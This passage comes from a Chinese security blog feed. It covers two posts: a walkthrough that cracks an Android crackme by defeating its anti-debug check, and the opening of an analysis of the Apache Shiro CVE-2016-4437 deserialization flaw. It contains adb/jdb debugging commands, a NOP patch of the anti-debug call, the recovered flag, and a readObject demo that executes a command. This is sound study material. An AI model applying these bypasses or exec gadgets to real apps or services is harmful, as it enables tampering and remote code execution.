src="https://img-blog.csdnimg.cn/d6181e62ec4d4de1865e24eab40aa674.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy">2、但是由于被调试程序一运行就会执行 static 中的语句，因此需要让程序停在加载 so 文件之前，这里可以添加 watiForDebugger，或者使用更加简单的方法，使用 debug 方式来启动 APP： </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">adb shell am start <span class="token operator">-</span><span class="token constant">D</span> <span class="token operator">-</span>n com<span class="token punctuation">.</span>yaotong<span class="token punctuation">.</span>crackme<span class="token operator">/</span><span class="token punctuation">.</span>MainActivity </code></pre><p>运行该命令后，目标 APP 将处于一个等待 Debugger 的状态：<br><img src="https://img-blog.csdnimg.cn/49b4457b2a5849c5b78f43ae9a78bce2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>3、IDA 开始对进程进行附加：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/6c70393ce43547438113b834d10a5803.png" alt="在这里插入图片描述" loading="lazy"><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/5cc3d3815ff24625a290c31ad1c4e534.png" alt="在这里插入图片描述" loading="lazy"><br>4、接着执行如下命令让 APP 运行起来：</p><pre class="language-c" data-language="c"><code class="language-c">进入设备： adb shell获取Root权限：su获得APP的进程ID：ps <span class="token operator">|</span> grep com<span class="token punctuation">.</span>yaotong<span class="token punctuation">.</span>crackme （直接关注上一步进程附加的 ID 也可以获得）监听进程的ID：adb forward tcp<span class="token operator">:</span><span class="token number">8700</span> jdwp<span class="token operator">:</span><span class="token number">4495</span>（<span class="token number">4495</span>为上面获得的APP进程ID）运行进程：jdb <span class="token operator">-</span>connect com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jdi<span class="token punctuation">.</span>SocketAttach<span class="token operator">:</span>hostname<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8700</span></code></pre><p>执行过程如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/23828bc56616434fa5f3cb1809664e4a.png" alt="在这里插入图片描述" loading="lazy">5、返回 IDA 按 F9 开始运行程序：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/355c7a9f9cfd4b69a57889536aed8e15.png" alt="在这里插入图片描述" loading="lazy">此时 APP 由等待 Debugger 状态进入如下页面：<br><img src="https://img-blog.csdnimg.cn/e8c56dbb11b246eab8207fb3a89bb4e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>6、继续按一下运行程序的按钮（或者 F9 快捷键），程序即会运行到刚才我设置的 JNI_OnLoad 函数断点处：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b0aeaaf003104cd4992a2e6e85b40ead.png" alt="在这里插入图片描述" loading="lazy">【注意】程序没有直接闪退的原因是此处的断点位置在检测调试的代码前面，故我们接下来就可以往下逐步运行程序来调试分析反调试的代码的逻辑和位置！</p><p>7、在进一步进行调试分析反调试检测代码前，我想补充一个点，实际上上面加载  JNI_OnLoad 函数断点的调试过程我在首次执行时失败，执行<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code>命令时遇到如下报错：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/ddbbcd62d51a444da66b011ad52f3d8b.png" alt="在这里插入图片描述" loading="lazy">报错的原因是目标 APP 不可被调试！解决的办法是修改 APP  AndroidMenifest.xml 文件， 在 &lt;application 里给APP加上可调试权限，<code>android:debuggable=&quot;true&quot;</code>，重新打包 APP 后重现编译、签名、安装，如下图所示：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/6f7f02a6088a410aa0fb471605728301.png" alt="在这里插入图片描述" loading="lazy">8、可见在 Android 真机上调试程序有一个前提，就是这个 apk 包必须有 <code>debuggable=true</code> 的属性才行，而除了自己开发的 apk 能够控制打包属性之外，其他的程序发行之后显然不会设这个值为 true 的（打包 APK 时 release 发布版本默认为 false 不可调试，只有 debug 版本可调试）。为了调试 APK 而每次都去修改配置文件并重打包也太麻烦了，实际上为了调试这些第三方的 apk，我们可以从整个手机系统入手 —— 因为除了每个 apk 中的 debuggable 标志以外，这个标志还可以在系统中全局指定，换句话说，只要把系统里的 debuggable 值设为 true（即将<code>/default.prop</code>中默认字段是 0 的<code>ro.debuggable</code>的值修改为 1，前提是手机需要 root ），那么不管 apk 的这个属性是什么值，该手机上的 APP 都可以被调试了。修改 ro.debuggable 的步骤：</p><pre class="language-c" data-language="c"><code class="language-c">下载 mprop 工具：https<span class="token operator">:</span><span class="token comment">//github.com/wpvsyou/mprop</span>adb push mprop <span class="token operator">/</span>data<span class="token operator">/</span>local<span class="token operator">/</span>tmp # 将下载的mprop 放入 <span class="token operator">/</span>data<span class="token operator">/</span>local<span class="token operator">/</span>tmp 当中adb shellsucat <span class="token keyword">default</span><span class="token punctuation">.</span>prop <span class="token operator">|</span> grep debug # 查看<span class="token keyword">default</span><span class="token punctuation">.</span>prop里面的配置值，此处是 <span class="token number">0</span>getprop ro<span class="token punctuation">.</span>debuggable         # 获取ro<span class="token punctuation">.</span>debuggable 此处应该是 <span class="token number">0</span>cd <span class="token operator">/</span>data<span class="token operator">/</span>local<span class="token operator">/</span>tmpchmod <span class="token number">755</span> mprop               # 修改权限<span class="token punctuation">.</span><span class="token operator">/</span>mprop ro<span class="token punctuation">.</span>debuggable <span class="token number">1</span>       # 修改 ro<span class="token punctuation">.</span>debuggable <span class="token number">1</span> 的值为 <span class="token number">1</span>cat <span class="token keyword">default</span><span class="token punctuation">.</span>prop <span class="token operator">|</span> grep debug # 查看<span class="token keyword">default</span><span class="token punctuation">.</span>prop里面的配置值，此处是应该还是 <span class="token number">0</span>getprop ro<span class="token punctuation">.</span>debuggable         # 获取 ro<span class="token punctuation">.</span>debuggable 此处应该是 <span class="token number">1</span></code></pre><p>ok，修改完成后，再次看下是不是可以调试了，执行命令<code>adb shell getprop | findstr debuggable</code>查看手机的<code>ro.debuggable</code>参数值：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/3e7609f6da1a4c82841bbf396bb529e5.png" alt="在这里插入图片描述" loading="lazy"><br>【<strong>再次强调</strong>】上面修改<code>ro.debuggable</code>参数值的过程需要在已 root 的手机中进行，同时手机再次重启后需要再次进行一次修改操作。</p><h2 id="2-3-反反调试"><a href="#2-3-反反调试" class="headerlink" title="2.3 反反调试"></a>2.3 反反调试</h2><p>好了，介绍完将真机设置全局可调试的模式后，我们返回到  JNI_OnLoad 函数断点处，继续分析程序检测调试状态的代码逻辑。<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b0aeaaf003104cd4992a2e6e85b40ead.png" alt="在这里插入图片描述" loading="lazy"><br>此处先小结一下上述在  JNI_OnLoad 函数设置断点并拦截程序的过程（即 IDA 调试具有反调试机制的程序的步骤）：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token number">1</span>）启动 android_server<span class="token number">2</span>）端口转发adb forward tcp<span class="token operator">:</span><span class="token number">23946</span> tcp<span class="token operator">:</span><span class="token number">23946</span>；<span class="token number">3</span>）打开 IDA，设置 JNI_OnLoad 函数断点并在 debug options 中设置 load so 的时机；<span class="token number">4</span>）adb shell am start <span class="token operator">-</span>D <span class="token operator">-</span>n 包名<span class="token operator">/</span>类名；出现 Debugger 的等待状态；（说明：以启动模式启动，是停在加载so文件之前，包名可以在 Androidmanifest 文件中找到）<span class="token number">5</span>）IDA Debugger 附加上对应的进程（留意目标 APP 的进程 ID）；<span class="token number">6</span>）运行命令：  adb forward tcp<span class="token operator">:</span><span class="token number">8700</span> jdwp<span class="token operator">:</span><span class="token number">4495</span>（<span class="token number">4495</span>为上面 IDA 附加的目标APP进程ID）  jdb <span class="token operator">-</span>connect com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jdi<span class="token punctuation">.</span>SocketAttach<span class="token operator">:</span>hostname<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8700</span><span class="token number">7</span>）点击 IDA 运行按钮，或者F9快捷键。</code></pre><p>1、按 F8 单步步过，继续往下运行程序，但是当我们每次到达 <code>BLX R7</code>这条指令执行完之后，JNI_OnLoad 就退出了:<br><img src="https://img-blog.csdnimg.cn/487a7b21b3c04bc8848ab214ef513430.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/82e6666ea2464b53804a014798ca1a17.png" alt="在这里插入图片描述" loading="lazy"></p><p>2、再次进入调试，看见运行到 BLX 跳转指令时 R7 寄存器中是 <code>pthread_create</code> 函数，这个是 Linux 中新建一个线程的方法：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/258dcb37d5f34e71ae075cda30707969.png" alt="在这里插入图片描述" loading="lazy">所以猜测阿里的反调试就在这里开启一个线程进行轮训操作，去读取<code>/proc/[pid]/status</code>文件中的 TrackerPid 字段值，如果发现不为 0，就表示有人在调试本应用，在 JNI_OnLoad 中直接退出。其实这里可以再详细进入查看具体代码实现的，但是这里限于篇幅问题，不详细解释了，后续将单独写一篇文章学习反调试机制，本文的重点是能够动态调试即可。</p><p>3、定位到关键的反调试检测代码位置后，该怎么绕过反调试检测？其实很简单，我们只要把<code>BLX R7</code>这段指令干掉即可，如果是 smali 代码的话，可以直接删除这行代码即可，但是 so 文件不一样，它是汇编指令，如果直接删除这条指令的话，文件会发生错乱，因为本身 so 文件就有固定的格式，比如很多 Segement 的内容，每个 Segement 的偏移值也是有保存的，如果这样去删除会影响这些偏移值，会破坏 so 文件格式，导致 so 加载出错的。所以这里我们不能手动的去删除这条指令，我们还有另外一种方法，就是把这条指令变成空指令，在汇编语言中，nop 指令就是一个空指令，它什么都不干，所以这里我们直接改一下指令即可，ARM 汇编中对应的 nop 指令是：<code>00 00 00 00</code>。首先恢复到静态分析的状态（退出动态分析），将鼠标定位到<code>BLX R7</code>指令处，切换到 “Hex View-1” 窗口可以看到该指令对应的十六进制表示形式为 <code>37 FF 2F E1</code>：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/a495c8539dc643d48af349202fb74e07.png" alt="在这里插入图片描述" loading="lazy"><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/78e08ab9a338452abc07b311faf02b37.png" alt="在这里插入图片描述" loading="lazy"><br>4、继续选中<code>BLX R7</code>指令然后选择如下“Change byte…”选项：<br><img src="https://img-blog.csdnimg.cn/08189027a9c847dc8a733cd28b118421.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy">修改<code>37 FF 2F E1</code>为<code>00 00 00 00</code>：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/6ac3bcc40ea64612b030924436471a56.png" alt="在这里插入图片描述" loading="lazy"><br>5、最后将所作的修改保存到 so 文件中（ IDA 中修改 SO 文件保存修改覆盖到 so 文件而非临时工程文件的方式：<code>edit-&gt;patch  program-&gt;  apply  patches  to  input  file...</code> ）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/fa858e7db20f411ea76bf3c708aa121f.png" alt="在这里插入图片描述" loading="lazy">至此已完成自毁程序 so 文件的修改，使得反调试的检测核心逻辑代码被破坏，新的 so 文件中将无法正常调用反调试检测代码。</p><h1 id="APK破解-下"><a href="#APK破解-下" class="headerlink" title="APK破解(下)"></a>APK破解(下)</h1><p>完成上述工作，我们来将新的 so 文件替换掉原来自毁程序 APK 里面的 so 文件，并尝试对其正常的动态调试分析。</p><h2 id="3-1-重新编译"><a href="#3-1-重新编译" class="headerlink" title="3.1 重新编译"></a>3.1 重新编译</h2><p>1、将上面获得的新的 so 文件替换掉原来自毁程序 APK 里面的 so 文件：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/e217fa6cc8d24966b1daaa3fe9732050.png" alt="在这里插入图片描述" loading="lazy"><br>2、在 AndroidKiller 中重新编译、打包、重签名自毁程序 APK：<br><img src="https://img-blog.csdnimg.cn/272d890318cc4b409edae79f71b41f20.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>接着将新的自毁程序 APK 一键安装到 Nexus5 测试机即可。</p><h2 id="3-2-动态调试"><a href="#3-2-动态调试" class="headerlink" title="3.2 动态调试"></a>3.2 动态调试</h2><p>新的自毁程序 APK 讲道理可以正常地被 IDA 动态调试分析而不会闪退了，下面来试试。</p><p>1、直接双击开始运行  APP 程序（无需再将 APP 处于一个等待 Debugger 的状态），然后正常运行 android_server 并转发 23946 端口，然后 debugger 勾选如下选项即可：<br><img src="https://img-blog.csdnimg.cn/3e25c06e0c6b458e9dc51e47f5e62df1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>2、取消 JNI_OnLoad 函数的断点（该函数反调试的逻辑已被破坏，无需再拦截并调试该函数），直接在 securityCheck() 函数设置如下断点：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/51c0e30db6894132bae827c359f0f4f1.png" alt="在这里插入图片描述" loading="lazy">3、IDA 开始正常附加 APP 程序进程，点击运行按钮或 F9 继续运行程序，程序不再闪退！！！！往输入框输入 1234 字符串并提交，发现程序被成功拦截在刚才设置的断点处了：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/14dd259cf527452e80ce7b6b3a6822e4.png" alt="在这里插入图片描述" loading="lazy">4、切换到 IDA View-PC 窗口查看断点并 F8 单步步过运行程序，观察到 if 判断语句对应的汇编指令 R2 寄存器存放的字符串为 “aiyou,bucuoyoo”，也 就是我们想要的目标密码/flag：<br><img src="https://img-blog.csdnimg.cn/7ba94685d9924c618679d5c276205c50.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy">5、将 flag 值输入自毁程序，成功破解密码：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b9cf9962a3c449fd96f9900280a948f0.png" alt="在这里插入图片描述" loading="lazy"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文篇幅相对较长，但也算学习了不少东西。从如何设置测试机真机全局可调试、再到 APK 反调试机制的动态分析和绕过、最后再到重编译程序并动态调试破解密码，整个实践流程下来耗费了不少时间（太菜了）……最后说一下，Android 反调试机制不局限于本例所提及的  TracerPid 字段检测，后面我将继续单独对 Android 反调试机制及其对抗机制进行学习。本文至此 Over！！！</p><p>本文参考文章：</p><ol><li><a href="https://bbs.pediy.com/thread-263810.htm">[原创]超级详细的实战分析一个Crackme的过程</a>（很细致，推荐）；</li><li><a href="https://blog.csdn.net/hbhgyu/article/details/81321923">安卓逆向实践5——IDA动态调试so源码</a>（分析很到位）；</li><li><a href="https://blog.csdn.net/m0_46204016/article/details/105605620">Android逆向之旅—动态方式破解apk进阶篇(IDA调试so源码)</a>（姜维大佬的文章）。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在前面的文章中 &lt;a href=&quot;https://bwshen.blog.csdn.net/article/details/12069966</summary>
      
    
    
    
    <category term="终端安全" scheme="https://tr0e.github.io/categories/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JAVA代码审计之Shiro反序列化漏洞分析</title>
    <link href="https://tr0e.github.io/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://tr0e.github.io/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-07-24T05:10:15.000Z</published>
    <updated>2022-06-15T16:09:37.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在前面的一篇文章：<a href="https://bwshen.blog.csdn.net/article/details/109269859">Apache Shiro Java反序列化漏洞复现</a> 曾介绍了 CVE-2016-4437 漏洞的复现过程和利用方式，为了不再当个“脚本小子”工具人…本文将记录学习下从源码审计的角度分析 CVE-2016-4437 漏洞的原理。</p><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><p>同样的在前面一篇博文：<a href="https://bwshen.blog.csdn.net/article/details/82051781">Java-序列化与反序列化</a> 已经讲述了 Java 序列化和反序列化的概念，此处简单再描述下。</p><p>把对象转换为字节序列的过程称为对象的序列化；把字节序列恢复为对象的过程称为对象的反序列化。</p><p>对象的序列化主要有两种用途：</p><ol><li>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中（持久化对象）；</li><li>在网络上传送对象的字节序列（网络传输对象）。</li></ol><p>当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java 对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为 Java 对象。 </p><p><strong>Java序列化实例</strong></p><p>来看一个实际的例子：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">People</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>上述代码定义了 People 类，并且实现了 Serializable 接口，我们便可以对其进行序列化和反序列化操作：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 初始化对象</span>        <span class="token class-name">People</span> people <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">People</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        people<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"xiaoming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        people<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 序列化步骤</span>        <span class="token comment">// 1. 创建一个ObjectOutputStream输出流</span>        <span class="token comment">// 2. 调用ObjectOutputStream对象的writeObject输出可序列化对象</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"d:/People.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>people<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"people对象序列化成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 反序列化步骤</span>        <span class="token comment">// 1. 创建一个ObjectInputStream输入流</span>        <span class="token comment">// 2. 调用ObjectInputStream对象的readObject()得到序列化的对象</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"d:/People.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">People</span> people1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">People</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"people对象反序列化成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>people1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>people1<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>代码运行结果：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">people对象序列化成功！people对象反序列化成功！xiaoming<span class="token number">18</span></code></pre><p>序列化过程将字节流保存在 d:/People.txt 中，我们可以在 d:/People.txt 看到序列化后的二进制对象（其中开头的 aced 0005 是 Java 序列化文件的文件头）：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/7864997cd6394c49993d994ea0b43ae9.png" alt="在这里插入图片描述" loading="lazy"><br><strong>反序列化漏洞</strong></p><p>回想一下 CTF 比赛经常遇到的 PHP 的反序列化漏洞，反序列化对象时会调用类的魔法函数<code>__construct()</code>(创建对象时触发)，我们可以构造 pop 链来控制(改造)<code>__construct()函</code>数，从而反序列化时执行我们需要的操作，Java 也是类似。</p><p>在上面的代码中，我们通过调用 readObject() 方法来从一个源输入流中读取字节序列，再把它们反序列化为一个对象，那么我们如果控制了此类的 readObject() 方法会怎么样？为了验证想法，我们修改一下 People 类，重写其 readObject() 方法：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">People</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//添加以下方法，重写People类的readObject()方法</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>        <span class="token comment">//执行默认的readObject()方法</span>        in<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行打开计算器程序命令</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>运行程序，当执行<code>People people1 = (People) ois.readObject();</code>语句时会调用 People 类的 readObject 方法，弹出计算器：<br><img src="https://img-blog.csdnimg.cn/ca674bfe48434e1c89d6f1e104675912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy">由此可知控制了类的 readObject 方法便可以在反序列化该类时执行任意操作。事实上大多数 Java 反序列化漏洞都可追溯到 readObject 方法，通过构造 pop 链最终改造 readObject() 方法。</p><h1 id="源码审计分析"><a href="#源码审计分析" class="headerlink" title="源码审计分析"></a>源码审计分析</h1><p>Apache Shiro 是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年网络中曝光 Apache Shiro 1.2.4 以前的版本存在反序列化漏洞，尽管该漏洞已经曝光几年，但是在实战中仍然比较实用。</p><p><strong>影响版本</strong></p><p>Apache Shiro &lt;= 1.2.4</p><p><strong>漏洞原理</strong></p><p>Apache Shiro 框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的Cookie。Cookie 的 key 为 RememberMe，Cookie 的值是经过对相关信息进行序列化，然后使用AES加密，最后在使用 Base64 编码处理形成的。</p><p>在服务端接收 Cookie值时，按照如下步骤来解析处理：</p><ol><li>检索 RememberMe cookie 的值；</li><li>Base 64解码；</li><li>使用AES解密(加密密钥硬编码)；</li><li>进行反序列化操作（未作过滤处理）。</li></ol><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><h2 id="IDEA-部署环境"><a href="#IDEA-部署环境" class="headerlink" title="IDEA 部署环境"></a>IDEA 部署环境</h2><p>下面在本地 IDEA 部署 Apache Shrio 1.2.4 漏洞环境，以便于进行漏洞动态调试分析。</p><p>1、首先在 Github 下载项目源码：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>apache<span class="token operator">/</span>shiro</code></pre><p>注意选择存在漏洞的 1.2.4 版本：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/f552f24c972241e190ad106a30e9c184.png" alt="在这里插入图片描述" loading="lazy">2、编辑 <code>shiro\samples\web</code> 路径下的 pom.xml 文件，给 jstl 指定版本：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/ee6b526e63584954b66d4b812c8fd643.png" alt="在这里插入图片描述" loading="lazy">3、使用 IDEA 导入此 MVN 项目：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b4c3ce063ade41d2816be118b27ae603.png" alt="在这里插入图片描述" loading="lazy"><img 